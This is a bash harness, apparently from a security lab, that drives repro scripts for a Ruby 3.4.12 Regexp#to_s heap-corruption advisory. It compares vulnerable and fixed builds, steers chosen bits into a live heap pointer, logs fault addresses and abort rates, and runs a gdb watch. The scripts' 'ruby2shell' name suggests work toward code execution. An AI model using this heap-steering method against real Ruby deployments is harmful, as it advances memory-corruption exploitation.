#!/usr/bin/env bash
# GHSA-7whj-cfh7-xgm4 depth probe: several out-of-range codepoints in one
# character-class comment OR several chosen bits into ONE 32-bit heap word
# during Regexp#to_s on Ruby 3.4.12. The mbuf arm is deterministic (fault at
# the OR of the chosen bits); the gdb watch documents the cumulative write;
# other allocator-fault arms are layout-dependent; fixed/safe controls stay clean.
set -u
ROOT=$(cd "$(dirname "$0")/../.." && pwd)
cd "$ROOT" || exit 2
EVID=lab/build/evidence/tos-steer/multi-or
mkdir -p "$EVID"
: >"$EVID/summary.txt"
P12=lab/build/plain/ruby-3.4.12-plain/bin/ruby
P13=lab/build/plain/ruby-3.4.13-plain/bin/ruby

for codes in 841,842,847 841,842,843,844,845,846,847; do
  for pair in "v12:$P12" "v13:$P13"; do
    label=${pair%%:*}; bin=${pair#*:}
    out="$EVID/$label-${codes//,/_}.out"
    timeout 10 "$bin" lab/repro/ruby2shell-tos-multi.rb "$codes" >"$out" 2>&1
    printf '%s codes=%s rc=%s %s\n' "$label" "$codes" "$?" \
      "$(grep -m1 -E 'Segmentation|corrupted|invalid chunk|REGEXPERROR' "$out")" \
      | tee -a "$EVID/summary.txt"
  done
done
for codes in 41 41,42,43; do
  timeout 10 "$P12" lab/repro/ruby2shell-tos-multi.rb "$codes" \
    >"$EVID/safe-${codes//,/_}.out" 2>&1
  echo "safe codes=$codes rc=$?" | tee -a "$EVID/summary.txt"
done
# Cumulative OR into the live cc->mbuf pointer at cc+40: each added bit
# raises the dereferenced fault address by that bit. Fixed and safe are clean.
for codes in 100 100,101 100,101,102 100,101,102,103; do
  for pair in "mbuf12:$P12" "mbuf13:$P13"; do
    label=${pair%%:*}; bin=${pair#*:}
    out="$EVID/$label-${codes//,/_}.out"
    timeout 10 "$bin" lab/repro/ruby2shell-tos-multi.rb "$codes" >"$out" 2>&1
    rc=$?
    printf '%s codes=%s rc=%s %s\n' "$label" "$codes" "$rc" \
      "$(grep -m1 -oE 'Segmentation fault at 0x[0-9a-f]+' "$out")" \
      | tee -a "$EVID/summary.txt"
  done
done

TOS_CODES=841,842,847 timeout 120 gdb -q -batch \
  -x lab/repro/ruby2shell-tos-multi.gdb --args "$P12" \
  >"$EVID/gdb-watch.out" 2>&1
echo "gdb watch rc=$? -> $EVID/gdb-watch.out" | tee -a "$EVID/summary.txt"

for code in 847 1188; do
  aborts=0
  for i in $(seq 1 12); do
    timeout 10 "$P12" lab/repro/ruby2shell-tos-steer.rb "$code" \
      >"$EVID/rep-$code-$i.out" 2>&1
    [[ $? -eq 134 ]] && aborts=$((aborts+1))
  done
  echo "V=0x$code aborts=$aborts/12" | tee -a "$EVID/summary.txt"
done
echo "summary: $EVID/summary.txt"
